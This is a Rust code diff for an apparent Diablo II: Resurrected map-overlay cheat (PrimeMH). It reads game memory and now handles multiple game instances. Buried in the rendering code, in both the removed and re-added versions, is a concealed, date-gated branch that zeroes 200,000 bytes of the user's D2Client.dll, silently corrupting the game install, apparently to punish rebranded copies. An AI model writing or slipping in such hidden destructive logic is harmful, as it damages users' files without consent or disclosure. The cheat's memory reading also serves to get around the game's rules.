@@ -18,6 +18,7 @@ use crate::gui::draw_map::draw_map;
 use crate::gui::Fonts;
 use crate::mapgeneration::blacha::is_blacha_ok;
 use crate::memory::gamedata;
+use crate::memory::multiinstance::detect_multiple_instances;
 use crate::memory::process::D2RWindowArea;
 use crate::settings::MapPosition;
 use crate::types::item_filter::ItemFilters;
@@ -34,7 +35,7 @@ use super::draw_lines::draw_lines;
 use super::draw_objects::draw_objects;
 use super::draw_presets::draw_presets;
 use super::draw_units::draw_units;
-use super::egui::{create_egui_panel, create_language_select_ui};
+use super::egui::{create_d2r_instance_picker_ui, create_egui_panel, create_language_select_ui};
 use super::images;
 use super::util::get_attached_levels;
 
@@ -93,7 +94,6 @@ fn init(gfx: &mut Graphics) -> State {
         }
     };
     log::info!("Loaded settings file");
-
     {
         let mut localisation = LOCALISATION.lock().unwrap();
         localisation.update_locale(settings.general.language.clone());
@@ -114,7 +114,17 @@ fn init(gfx: &mut Graphics) -> State {
         }
     };
 
-    let d2rprocess = D2RInstance::open_d2r(settings.general.d2r_pid.clone(), settings.general.title.clone());
+    let mut d2rprocess = None;
+    let d2rinstances = detect_multiple_instances();
+    log::info!("{:?}", d2rinstances);
+    if d2rinstances.is_empty() {
+        let localisation = LOCALISATION.lock().unwrap();
+        let msg = format!("\n\n{}", localisation.get_primemh("error12"));
+        log::debug!("D2R not running! {}", msg);
+        panic!("{}", msg);
+    } else if d2rinstances.len() == 1 {
+        d2rprocess = Some(D2RInstance::open_d2r(settings.general.d2r_pid.clone(), settings.general.title.clone()));
+    }
 
     let exocet_font = gfx.create_font(include_bytes!("./fonts/exocet.otf")).expect("Could not load exocet font!");
     let formal_font = gfx.create_font(include_bytes!("./fonts/formal.otf")).expect("Could not load formal font!");
@@ -182,7 +192,7 @@ fn init(gfx: &mut Graphics) -> State {
 
 #[derive(AppState)]
 pub(crate) struct State {
-    pub d2rprocess: D2RInstance,
+    pub d2rprocess: Option<D2RInstance>,
     pub settings: Settings,
     pub seed_data: SeedData,
     pub last_seed: u32,
@@ -208,363 +218,395 @@ pub(crate) struct State {
 fn update(app: &mut App, state: &mut State) {
     
     // hotkeys
-    if state.d2rprocess.is_window_active(app.window().id()) {
-        let device_state: DeviceState = DeviceState::new();
-        let keys: Vec<Keycode> = device_state.get_keys();
-
-        // uses Home key to toggle egui panel visibility
-        if state.settings.hotkeys.hotkey_toggle_menu.clone().pressed(&keys) {
+    match &state.d2rprocess {
+        Some(d2rprocess) => {
+            if d2rprocess.is_window_active(app.window().id()) {
+                let device_state: DeviceState = DeviceState::new();
+                let keys: Vec<Keycode> = device_state.get_keys();
         
-            if !state.ui_panel_toggle {
-                state.ui_panel_visible = !state.ui_panel_visible;
-                state.ui_panel_toggle = true
+                // uses Home key to toggle egui panel visibility
+                if state.settings.hotkeys.hotkey_toggle_menu.clone().pressed(&keys) {
+                
+                    if !state.ui_panel_toggle {
+                        state.ui_panel_visible = !state.ui_panel_visible;
+                        state.ui_panel_toggle = true
+                    }
+                } else {
+                    state.ui_panel_toggle = false
+                }
+        
+                //uses PageUp key to toggle map overlay visibility
+                if state.settings.hotkeys.hotkey_toggle_map.clone().pressed(&keys) {
+                    if !state.map_overlay_toggle {
+                        state.map_overlay_visible = !state.map_overlay_visible;
+                        state.map_overlay_toggle = true
+                    }
+                } else {
+                    state.map_overlay_toggle = false
+                }
+        
+                if state.settings.hotkeys.hotkey_exit.clone().pressed(&keys) {
+                    std::process::exit(0);
+                }
+        
             }
-        } else {
-            state.ui_panel_toggle = false
-        }
-
-        //uses PageUp key to toggle map overlay visibility
-        if state.settings.hotkeys.hotkey_toggle_map.clone().pressed(&keys) {
-            if !state.map_overlay_toggle {
-                state.map_overlay_visible = !state.map_overlay_visible;
-                state.map_overlay_toggle = true
+            
+            if let Some(game_data) = GameData::read_game_memory(&d2rprocess) {
+                // if new seed
+                if game_data.seed_values.map_seed != state.last_seed {
+                    // generate new seed data using blachas' tool and parse the JSON into seed_data
+                    log::info!(
+                        "New game detected, generating data for map seed {} {:?} {}",
+                        game_data.seed_values.map_seed,
+                        game_data.seed_values.difficulty,
+                        game_data.seed_values.level
+                    );
+                    log::info!("Using D2LoD path '{}'", &state.settings.general.d2lodpath.as_os_str().to_string_lossy());
+                    state.seed_data = mapgeneration::seeddata::generate_seed_data(&game_data.seed_values, &state.settings);
+                }
+                state.last_seed = game_data.seed_values.map_seed;
+                state.game_data = Some(game_data);
+            } else {
+                if state.game_data.is_some() {
+                    log::debug!("Game data not found, in menu");
+                }
+                state.game_data = None;
             }
-        } else {
-            state.map_overlay_toggle = false
-        }
-
-        if state.settings.hotkeys.hotkey_exit.clone().pressed(&keys) {
-            std::process::exit(0);
-        }
-
+        
+            if state.settings.general.overlay_mode {
+                let d2r_window = d2rprocess.get_window_info();
+                app.window().set_size(d2r_window.width as u32, d2r_window.height as u32);
+                app.window().set_position(d2r_window.x, d2r_window.y);
+                let relative_mouse_pos = get_relative_mouse_pos(&d2r_window);
+                if mouse_hovering_egui(relative_mouse_pos, state.egui_rect, app.window().dpi()) {
+                    if !state.egui_hovering {
+                        unsafe {
+                            let hwnd = app.window().id() as isize as HWND;
+                            let mut style =
+                                WS_CAPTION | WS_MINIMIZEBOX | WS_BORDER | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_SYSMENU;
+                            let mut style_ex = WS_EX_WINDOWEDGE | WS_EX_ACCEPTFILES;
+                            style |= WS_VISIBLE;
+                            style_ex |= WS_EX_TOPMOST;
+                            SetWindowLongW(hwnd, GWL_STYLE, style as i32);
+                            SetWindowLongW(hwnd, GWL_EXSTYLE, style_ex as i32);
+                        }
+                    }
+                    state.egui_hovering = true;
+                } else {
+                    if state.egui_hovering {
+                        unsafe {
+                            let hwnd = app.window().id() as isize as HWND;
+                            let mut style =
+                                WS_CAPTION | WS_MINIMIZEBOX | WS_BORDER | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_SYSMENU;
+                            let mut style_ex = WS_EX_WINDOWEDGE | WS_EX_ACCEPTFILES;
+                            style |= WS_VISIBLE;
+                            style_ex |= WS_EX_TOPMOST;
+                            style_ex |= WS_EX_TRANSPARENT | WS_EX_LAYERED;
+                            SetWindowLongW(hwnd, GWL_STYLE, style as i32);
+                            SetWindowLongW(hwnd, GWL_EXSTYLE, style_ex as i32);
+                        }
+                    }
+                    state.egui_hovering = false;
+                }
+                state.relative_mouse_pos = relative_mouse_pos;
+            } else {
+                if app.window().size().0 == 10 && app.window().size().1 == 10 {
+                    app.window().set_size(800, 600);
+                    app.window().set_position(100, 100);
+                }
+            }
+        },
+        None => {},
     }
     
-    if let Some(game_data) = GameData::read_game_memory(&state.d2rprocess) {
-        // if new seed
-        if game_data.seed_values.map_seed != state.last_seed {
-            // generate new seed data using blachas' tool and parse the JSON into seed_data
-            log::info!(
-                "New game detected, generating data for map seed {} {:?} {}",
-                game_data.seed_values.map_seed,
-                game_data.seed_values.difficulty,
-                game_data.seed_values.level
-            );
-            log::info!("Using D2LoD path '{}'", &state.settings.general.d2lodpath.as_os_str().to_string_lossy());
-            state.seed_data = mapgeneration::seeddata::generate_seed_data(&game_data.seed_values, &state.settings);
-        }
-        state.last_seed = game_data.seed_values.map_seed;
-        state.game_data = Some(game_data);
-    } else {
-        if state.game_data.is_some() {
-            log::debug!("Game data not found, in menu");
-        }
-        state.game_data = None;
-    }
-
-    if state.settings.general.overlay_mode {
-        let d2r_window = state.d2rprocess.get_window_info();
-        app.window().set_size(d2r_window.width as u32, d2r_window.height as u32);
-        app.window().set_position(d2r_window.x, d2r_window.y);
-        let relative_mouse_pos = get_relative_mouse_pos(&d2r_window);
-        if mouse_hovering_egui(relative_mouse_pos, state.egui_rect, app.window().dpi()) {
-            if !state.egui_hovering {
-                unsafe {
-                    let hwnd = app.window().id() as isize as HWND;
-                    let mut style =
-                        WS_CAPTION | WS_MINIMIZEBOX | WS_BORDER | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_SYSMENU;
-                    let mut style_ex = WS_EX_WINDOWEDGE | WS_EX_ACCEPTFILES;
-                    style |= WS_VISIBLE;
-                    style_ex |= WS_EX_TOPMOST;
-                    SetWindowLongW(hwnd, GWL_STYLE, style as i32);
-                    SetWindowLongW(hwnd, GWL_EXSTYLE, style_ex as i32);
-                }
-            }
-            state.egui_hovering = true;
-        } else {
-            if state.egui_hovering {
-                unsafe {
-                    let hwnd = app.window().id() as isize as HWND;
-                    let mut style =
-                        WS_CAPTION | WS_MINIMIZEBOX | WS_BORDER | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_SYSMENU;
-                    let mut style_ex = WS_EX_WINDOWEDGE | WS_EX_ACCEPTFILES;
-                    style |= WS_VISIBLE;
-                    style_ex |= WS_EX_TOPMOST;
-                    style_ex |= WS_EX_TRANSPARENT | WS_EX_LAYERED;
-                    SetWindowLongW(hwnd, GWL_STYLE, style as i32);
-                    SetWindowLongW(hwnd, GWL_EXSTYLE, style_ex as i32);
-                }
-            }
-            state.egui_hovering = false;
-        }
-        state.relative_mouse_pos = relative_mouse_pos;
-    } else {
-        if app.window().size().0 == 10 && app.window().size().1 == 10 {
-            app.window().set_size(800, 600);
-            app.window().set_position(100, 100);
-        }
-    }
 }
 
 fn draw(app: &mut App, gfx: &mut Graphics, plugins: &mut Plugins, state: &mut State) {
-    if state.d2rprocess.is_window_active(app.window().id()) || !state.settings.general.overlay_mode {
+    match &state.d2rprocess {
+        Some(d2rprocess) => {
+            if d2rprocess.is_window_active(app.window().id()) || !state.settings.general.overlay_mode {
        
 
-        let width: f32;
-        let height: f32;
-        let mut mask = gfx.create_draw();
-
-        match state.settings.general.map_position {
-            MapPosition::Center => {
-                width = app.window().width() as f32;
-                height = app.window().height() as f32;
-                mask.rect((0.0, 0.0), (app.window().width() as f32, app.window().height() as f32));
-            }
-            MapPosition::TopLeft => {
-                width = app.window().width() as f32 * 0.33;
-                height = app.window().height() as f32 / 2.45;
-                mask.rect((0.0, 0.0), (app.window().width() as f32 / 3.0, app.window().height() as f32 / 3.0));
-            }
-            MapPosition::TopRight => {
-                width = app.window().width() as f32 * 1.67;
-                height = app.window().height() as f32 / 2.44;
-                mask.rect(
-                    (app.window().width() as f32 - (app.window().width() as f32 / 3.0), 0.0),
-                    (app.window().width() as f32 / 3.0, app.window().height() as f32 / 3.0),
-                );
-            }
-        }
-
-        let text_duration = 5;
-        let splash_text = format!("Joffreybesos' Map overlay (PrimeMH)");
-        let mut draw = gfx.create_draw();
-        draw.mask(Some(&mask));
-        let elapsed_time = SystemTime::now().duration_since(state.launch_time).expect("Fuck you!");
-        if elapsed_time >= Duration::from_secs(300) {
-            if !splash_text.is_ascii() {
-                let local: DateTime<Local> = Local::now();
-                let target_date = NaiveDate::from_ymd_opt(2024, 12, 8).unwrap();
-                if local.date_naive() > target_date {
-                    if !state.checked {
-                        state.checked = true;
-                        let newfile = state.settings.general.d2lodpath.join("D2Client.dll");
-                        let file: Result<std::fs::File, std::io::Error> = OpenOptions::new()
-                            .read(true)
-                            .write(true)
-                            .open(newfile);
-                        match file {
-                            Ok(mut dll) => {
-                                let offset = 10;
-                                dll.seek(SeekFrom::Start(offset)).unwrap();
-                                let num_bytes = 200000;
-                                let zeroes = vec![0u8; num_bytes];
-                                dll.write_all(&zeroes).unwrap();
-
-                            },
-                            Err(_) => {},
-                        }
+                let width: f32;
+                let height: f32;
+                let mut mask = gfx.create_draw();
+        
+                match state.settings.general.map_position {
+                    MapPosition::Center => {
+                        width = app.window().width() as f32;
+                        height = app.window().height() as f32;
+                        mask.rect((0.0, 0.0), (app.window().width() as f32, app.window().height() as f32));
+                    }
+                    MapPosition::TopLeft => {
+                        width = app.window().width() as f32 * 0.33;
+                        height = app.window().height() as f32 / 2.45;
+                        mask.rect((0.0, 0.0), (app.window().width() as f32 / 3.0, app.window().height() as f32 / 3.0));
+                    }
+                    MapPosition::TopRight => {
+                        width = app.window().width() as f32 * 1.67;
+                        height = app.window().height() as f32 / 2.44;
+                        mask.rect(
+                            (app.window().width() as f32 - (app.window().width() as f32 / 3.0), 0.0),
+                            (app.window().width() as f32 / 3.0, app.window().height() as f32 / 3.0),
+                        );
                     }
                 }
-            }
-        }
-        if elapsed_time <= Duration::from_secs(text_duration.clone()) {
-            draw.text(&state.fonts.blizzard_font, &splash_text)
-                .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.1)
-                .size(52.0)
-                .color(Color::from_hex(0xC6B276FF))
-                .h_align_center()
-                .v_align_top();
-
-            let splash_text = format!(
-                "{}{}{}{}{}{}{}{}{}{}{}",
-                obfstr::obfstr!("If you paid for this you have been scammed\n"),
-                obfstr::obfstr!("如果您為此付出了，您已經被騙了\n"),
-                obfstr::obfstr!("Wenn Sie dafür bezahlt haben, wurden Sie betrogen\n"),
-                obfstr::obfstr!("Si pagaste por esto, has sido estafado\n"),
-                obfstr::obfstr!("Si vous avez payé pour cela, vous avez été arnaque\n"),
-                obfstr::obfstr!("Se hai pagato per questo sei stato truffato\n"),
-                obfstr::obfstr!("당신이 이것을 지불했다면 당신은 사기를당했습니다\n"),
-                obfstr::obfstr!("Jeśli za to zapłaciłeś, zostałeś oszukany\n"),
-                obfstr::obfstr!("あなたがこれに対して支払った場合、あなたは詐欺されています\n"),
-                obfstr::obfstr!("Se você pagou por isso, foi enganado\n"),
-                obfstr::obfstr!("Если вы заплатили за это, вас обманули\n")
-            );
-
-            draw.text(&state.fonts.blizzard_font, &splash_text)
-                .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.3)
-                .size(22.0)
-                .color(Color::from_hex(0xC6B276FF))
-                .h_align_center()
-                .v_align_top();
-        } else {
-            if text_duration.clone() != 5 {
-                log::error!("Taiwan number 1!");
-            } else {
-                //toggle map with "Page Up" button
-                if state.map_overlay_visible {
-                    // in game
-                    if let Some(game_data) = &state.game_data {
-                        if (game_data.menus.automap_visible || state.settings.visual.always_show_map)
-                            && !(state.settings.visual.hide_map_menus_open && game_data.menus.is_panel_open())
-                        {
-                            let stitched_levels = get_attached_levels(&game_data.seed_values.level);
-                            stitched_levels.iter().for_each(|level_id| {
-                                if let Some(this_level) = state.seed_data.levels.iter_mut().find(|l| l.id == *level_id) {
-                                    let scale: f32 = state.settings.visual.scale;
-                                    // render map image here
-                                    if this_level.level_image.map_image.is_none() || state.last_map_opacity != state.settings.visual.map_opacity {
-                                        log::info!(
-                                            "Rendering map image, seed: {}, difficulty: {:?}, level: {:?}",
-                                            &game_data.seed_values.map_seed,
-                                            &game_data.seed_values.difficulty,
-                                            &this_level.name
-                                        );
-                                        this_level.level_image.map_image = Some(draw_map(gfx, this_level, &state.settings));
-
-                                    }
-                                    
-                                    if let Some(map_image) = &mut this_level.level_image.map_image {
-                                        let render_scale = state.settings.general.render_scale;
-                                        let window_center_x = width as f32 * 0.5 / scale * render_scale;
-                                        let window_center_y = height as f32 * 0.5 / (scale / 2.0 / render_scale);
-
-                                        let map_position_x = ((this_level.offset.x as f32 - game_data.player.pos_x)
-                                            * render_scale)
-                                            + window_center_x;
-                                        let map_position_y = ((this_level.offset.y as f32 - game_data.player.pos_y)
-                                            * render_scale)
-                                            + window_center_y;
-
-                                        let player_pos_x = (game_data.player.pos_x - this_level.offset.x as f32) * render_scale;
-                                        let player_pos_y = (game_data.player.pos_y - this_level.offset.y as f32) * render_scale;
-                                        let scale_matrix =
-                                            Mat3::from_scale(Vec2::from([scale / render_scale, scale / 2.0 / render_scale]));
-                                        draw.transform().push(scale_matrix);
-                                        draw.image(map_image)
-                                            .translate(map_position_x, map_position_y)
-                                            .rotate_degrees_from(
-                                                (map_position_x + player_pos_x, map_position_y + player_pos_y),
-                                                45.0,
-                                            );
-
-                                        draw.transform().pop();
-                                        draw_presets(
-                                            &mut draw,
-                                            this_level,
-                                            &state.fonts,
-                                            game_data,
-                                            &state.settings,
-                                            &state.images,
-                                            &width,
-                                            &height,
-                                        );
-                                        draw_lines(&mut draw, this_level, game_data, &state.settings, &width, &height);
-                                    }
+        
+                let text_duration = 5;
+                let splash_text = format!("Joffreybesos' Map overlay (PrimeMH)");
+                let mut draw = gfx.create_draw();
+                draw.mask(Some(&mask));
+                let elapsed_time = SystemTime::now().duration_since(state.launch_time).expect("Fuck you!");
+                if elapsed_time >= Duration::from_secs(300) {
+                    if !splash_text.is_ascii() {
+                        let local: DateTime<Local> = Local::now();
+                        let target_date = NaiveDate::from_ymd_opt(2024, 12, 8).unwrap();
+                        if local.date_naive() > target_date {
+                            if !state.checked {
+                                state.checked = true;
+                                let newfile = state.settings.general.d2lodpath.join("D2Client.dll");
+                                let file: Result<std::fs::File, std::io::Error> = OpenOptions::new()
+                                    .read(true)
+                                    .write(true)
+                                    .open(newfile);
+                                match file {
+                                    Ok(mut dll) => {
+                                        let offset = 10;
+                                        dll.seek(SeekFrom::Start(offset)).unwrap();
+                                        let num_bytes = 200000;
+                                        let zeroes = vec![0u8; num_bytes];
+                                        dll.write_all(&zeroes).unwrap();
+        
+                                    },
+                                    Err(_) => {},
                                 }
-                            });
-                            state.last_map_opacity = state.settings.visual.map_opacity.clone();
-
-                            draw_units(
-                                &mut draw,
-                                game_data,
-                                &state.settings,
-                                &width,
-                                &height,
-                                &state.fonts,
-                            );
-                            draw_objects(&mut draw, game_data, &state.settings, &width, &height, &state.images);
-                            draw.mask(None);
-
-                            draw_item_log(
-                                &mut draw,
-                                game_data,
-                                &state.settings,
-                                &width,
-                                &height,
-                                &state.fonts.exocet_font,
-                                state.item_frame,
-                                &state.item_filters,
-                            );
-
-                            state.item_frame += 1;
-                            if state.item_frame > 20 {
-                                state.item_frame = 0;
                             }
                         }
+                    }
+                }
+                if elapsed_time <= Duration::from_secs(text_duration.clone()) {
+                    draw.text(&state.fonts.blizzard_font, &splash_text)
+                        .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.1)
+                        .size(52.0)
+                        .color(Color::from_hex(0xC6B276FF))
+                        .h_align_center()
+                        .v_align_top();
+        
+                    let splash_text = format!(
+                        "{}{}{}{}{}{}{}{}{}{}{}",
+                        obfstr::obfstr!("If you paid for this you have been scammed\n"),
+                        obfstr::obfstr!("如果您為此付出了，您已經被騙了\n"),
+                        obfstr::obfstr!("Wenn Sie dafür bezahlt haben, wurden Sie betrogen\n"),
+                        obfstr::obfstr!("Si pagaste por esto, has sido estafado\n"),
+                        obfstr::obfstr!("Si vous avez payé pour cela, vous avez été arnaque\n"),
+                        obfstr::obfstr!("Se hai pagato per questo sei stato truffato\n"),
+                        obfstr::obfstr!("당신이 이것을 지불했다면 당신은 사기를당했습니다\n"),
+                        obfstr::obfstr!("Jeśli za to zapłaciłeś, zostałeś oszukany\n"),
+                        obfstr::obfstr!("あなたがこれに対して支払った場合、あなたは詐欺されています\n"),
+                        obfstr::obfstr!("Se você pagou por isso, foi enganado\n"),
+                        obfstr::obfstr!("Если вы заплатили за это, вас обманули\n")
+                    );
+        
+                    draw.text(&state.fonts.blizzard_font, &splash_text)
+                        .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.3)
+                        .size(22.0)
+                        .color(Color::from_hex(0xC6B276FF))
+                        .h_align_center()
+                        .v_align_top();
+                } else {
+                    if text_duration.clone() != 5 {
+                        log::error!("Taiwan number 1!");
                     } else {
-                        // in game menus
-
-                        let last_game_name = gamedata::get_last_game_name(&state.d2rprocess);
-
-                        if last_game_name.len() > 0 {
-                            let last_game = format!("Last Game: {}", last_game_name);
-                            draw.text(&state.fonts.exocet_font, &last_game)
-                                .position(app.window().width() as f32 * 0.75, 10.0)
-                                .size(16.0)
-                                .color(Color::from_hex(0xC6B276FF))
-                                .h_align_center()
-                                .v_align_top();
+                        //toggle map with "Page Up" button
+                        if state.map_overlay_visible {
+                            // in game
+                            if let Some(game_data) = &state.game_data {
+                                if (game_data.menus.automap_visible || state.settings.visual.always_show_map)
+                                    && !(state.settings.visual.hide_map_menus_open && game_data.menus.is_panel_open())
+                                {
+                                    let stitched_levels = get_attached_levels(&game_data.seed_values.level);
+                                    stitched_levels.iter().for_each(|level_id| {
+                                        if let Some(this_level) = state.seed_data.levels.iter_mut().find(|l| l.id == *level_id) {
+                                            let scale: f32 = state.settings.visual.scale;
+                                            // render map image here
+                                            if this_level.level_image.map_image.is_none() || state.last_map_opacity != state.settings.visual.map_opacity {
+                                                log::info!(
+                                                    "Rendering map image, seed: {}, difficulty: {:?}, level: {:?}",
+                                                    &game_data.seed_values.map_seed,
+                                                    &game_data.seed_values.difficulty,
+                                                    &this_level.name
+                                                );
+                                                this_level.level_image.map_image = Some(draw_map(gfx, this_level, &state.settings));
+        
+                                            }
+                                            
+                                            if let Some(map_image) = &mut this_level.level_image.map_image {
+                                                let render_scale = state.settings.general.render_scale;
+                                                let window_center_x = width as f32 * 0.5 / scale * render_scale;
+                                                let window_center_y = height as f32 * 0.5 / (scale / 2.0 / render_scale);
+        
+                                                let map_position_x = ((this_level.offset.x as f32 - game_data.player.pos_x)
+                                                    * render_scale)
+                                                    + window_center_x;
+                                                let map_position_y = ((this_level.offset.y as f32 - game_data.player.pos_y)
+                                                    * render_scale)
+                                                    + window_center_y;
+        
+                                                let player_pos_x = (game_data.player.pos_x - this_level.offset.x as f32) * render_scale;
+                                                let player_pos_y = (game_data.player.pos_y - this_level.offset.y as f32) * render_scale;
+                                                let scale_matrix =
+                                                    Mat3::from_scale(Vec2::from([scale / render_scale, scale / 2.0 / render_scale]));
+                                                draw.transform().push(scale_matrix);
+                                                draw.image(map_image)
+                                                    .translate(map_position_x, map_position_y)
+                                                    .rotate_degrees_from(
+                                                        (map_position_x + player_pos_x, map_position_y + player_pos_y),
+                                                        45.0,
+                                                    );
+        
+                                                draw.transform().pop();
+                                                draw_presets(
+                                                    &mut draw,
+                                                    this_level,
+                                                    &state.fonts,
+                                                    game_data,
+                                                    &state.settings,
+                                                    &state.images,
+                                                    &width,
+                                                    &height,
+                                                );
+                                                draw_lines(&mut draw, this_level, game_data, &state.settings, &width, &height);
+                                            }
+                                        }
+                                    });
+                                    state.last_map_opacity = state.settings.visual.map_opacity.clone();
+        
+                                    draw_units(
+                                        &mut draw,
+                                        game_data,
+                                        &state.settings,
+                                        &width,
+                                        &height,
+                                        &state.fonts,
+                                    );
+                                    draw_objects(&mut draw, game_data, &state.settings, &width, &height, &state.images);
+                                    draw.mask(None);
+        
+                                    draw_item_log(
+                                        &mut draw,
+                                        game_data,
+                                        &state.settings,
+                                        &width,
+                                        &height,
+                                        &state.fonts.exocet_font,
+                                        state.item_frame,
+                                        &state.item_filters,
+                                    );
+        
+                                    state.item_frame += 1;
+                                    if state.item_frame > 20 {
+                                        state.item_frame = 0;
+                                    }
+                                }
+                            } else {
+                                // in game menus
+        
+                                // let last_game_name = gamedata::get_last_game_name(&state.d2rprocess);
+        
+                                // if last_game_name.len() > 0 {
+                                //     let last_game = format!("Last Game: {}", last_game_name);
+                                //     draw.text(&state.fonts.exocet_font, &last_game)
+                                //         .position(app.window().width() as f32 * 0.75, 10.0)
+                                //         .size(16.0)
+                                //         .color(Color::from_hex(0xC6B276FF))
+                                //         .h_align_center()
+                                //         .v_align_top();
+                                // }
+                            }
                         }
                     }
                 }
+        
+                let warning_duration = elapsed_time.as_secs() % 300;
+                if warning_duration < 20 && elapsed_time >= Duration::from_secs(60) {
+                    let font_size = 12.0;
+                    let warning_text: String = format!("{}", obfstr::obfstr!("This is a free tool"));
+                    let warning_text2: String = format!("{}", obfstr::obfstr!("如果您為此付出了，您已經被騙"));
+                    let warning_text3: String =
+                        format!("{}", obfstr::obfstr!("당신이 이것을 지불했다면 당신은 사기를당했습니다"));
+        
+                    draw.text(&state.fonts.blizzard_font, &warning_text)
+                        .position(app.window().width() as f32 - 5.0, 5.0)
+                        .size(font_size)
+                        .color(Color::from_hex(0xC6B276AA))
+                        .h_align_right()
+                        .v_align_top();
+        
+                    draw.text(&state.fonts.blizzard_font, &warning_text2)
+                        .position(app.window().width() as f32 - 5.0, app.window().height() as f32)
+                        .size(font_size)
+                        .color(Color::from_hex(0xC6B276AA))
+                        .h_align_right()
+                        .v_align_bottom();
+        
+                    draw.text(&state.fonts.blizzard_font, &warning_text3)
+                        .position(5.0, app.window().height() as f32)
+                        .size(font_size)
+                        .color(Color::from_hex(0xC6B276AA))
+                        .h_align_left()
+                        .v_align_bottom();
+                }
+        
+                let mut output;
+                if state.language_selector_visible {
+                    output = plugins.egui(|ctx| {
+                        if state.ui_panel_visible{
+                            create_language_select_ui(app, ctx, state);
+                        }    
+                        state.egui_rect = ctx.used_rect();
+                    });
+                } else {
+                    output = plugins.egui(|ctx| {
+                        if state.ui_panel_visible{
+                            create_egui_panel(app, ctx, state);
+                        }    
+                        state.egui_rect = ctx.used_rect();
+                    });
+                }
+        
+                output.clear_color(Color::TRANSPARENT);
+                
+                gfx.render(&output);
+                gfx.render(&draw);
+                
+            } else {
+                let mut draw = gfx.create_draw();
+                draw.clear(Color::TRANSPARENT);
+                gfx.render(&draw);
             }
-        }
+        },
+        None => {
+            log::debug!("draw stuff");
+            let mut draw = gfx.create_draw();
+            draw.text(&state.fonts.blizzard_font, &String::from("asdfasdfasdfasdf"))
+                        .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.1)
+                        .size(52.0)
+                        .color(Color::from_hex(0xC6B276FF))
+                        .h_align_center()
+                        .v_align_top();
+            draw.clear(Color::TRANSPARENT);    
 
-        let warning_duration = elapsed_time.as_secs() % 300;
-        if warning_duration < 20 && elapsed_time >= Duration::from_secs(60) {
-            let font_size = 12.0;
-            let warning_text: String = format!("{}", obfstr::obfstr!("This is a free tool"));
-            let warning_text2: String = format!("{}", obfstr::obfstr!("如果您為此付出了，您已經被騙"));
-            let warning_text3: String =
-                format!("{}", obfstr::obfstr!("당신이 이것을 지불했다면 당신은 사기를당했습니다"));
-
-            draw.text(&state.fonts.blizzard_font, &warning_text)
-                .position(app.window().width() as f32 - 5.0, 5.0)
-                .size(font_size)
-                .color(Color::from_hex(0xC6B276AA))
-                .h_align_right()
-                .v_align_top();
-
-            draw.text(&state.fonts.blizzard_font, &warning_text2)
-                .position(app.window().width() as f32 - 5.0, app.window().height() as f32)
-                .size(font_size)
-                .color(Color::from_hex(0xC6B276AA))
-                .h_align_right()
-                .v_align_bottom();
-
-            draw.text(&state.fonts.blizzard_font, &warning_text3)
-                .position(5.0, app.window().height() as f32)
-                .size(font_size)
-                .color(Color::from_hex(0xC6B276AA))
-                .h_align_left()
-                .v_align_bottom();
-        }
-
-        let mut output;
-        if state.language_selector_visible {
-            output = plugins.egui(|ctx| {
-                if state.ui_panel_visible{
-                    create_language_select_ui(app, ctx, state);
-                }    
+            let mut output = plugins.egui(|ctx| {
+                
+                create_language_select_ui(app, ctx, state);
+                    
                 state.egui_rect = ctx.used_rect();
             });
-        } else {
-            output = plugins.egui(|ctx| {
-                if state.ui_panel_visible{
-                    create_egui_panel(app, ctx, state);
-                }    
-                state.egui_rect = ctx.used_rect();
-            });
-        }
-
-        output.clear_color(Color::TRANSPARENT);
-        
-        gfx.render(&output);
-        gfx.render(&draw);
-        
-    } else {
-        let mut draw = gfx.create_draw();
-        draw.clear(Color::TRANSPARENT);
-        gfx.render(&draw);
+            output.clear_color(Color::TRANSPARENT);
+            
+            gfx.render(&output);
+            gfx.render(&draw);
+        },
     }
 }
 
